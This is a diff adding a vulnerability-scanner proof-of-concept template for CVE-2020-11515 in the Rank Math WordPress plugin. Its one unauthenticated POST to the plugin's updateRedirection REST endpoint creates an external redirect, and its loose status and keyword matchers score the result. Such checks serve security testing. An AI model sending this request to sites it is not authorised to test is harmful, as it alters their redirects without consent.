@@ -1,0 +1,49 @@
+[info]
+author = "ave"
+description = "AVE-2020-0043 PoC: 验证 Rank Math 插件未授权重定向创建漏洞，通过 rankmath/v1/updateRedirection REST API 端点未验证创建外部跳转 URI"
+id = "POC-AVE-2020-0043"
+name = "PoC for AVE-2020-0043"
+severity = "medium"
+tags = [
+    "cve-2020-11515",
+    "ave-2020-0043",
+]
+vuln_id = [
+    "AVE-2020-0043",
+    "CVE-2020-11515",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wp-json/rankmath/v1/updateRedirection"
+
+[poc.requests.body]
+content = '{"url":"https://example.com","redir_status":301}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+    301,
+    302,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "success",
+    "updated",
+    "created",
+]
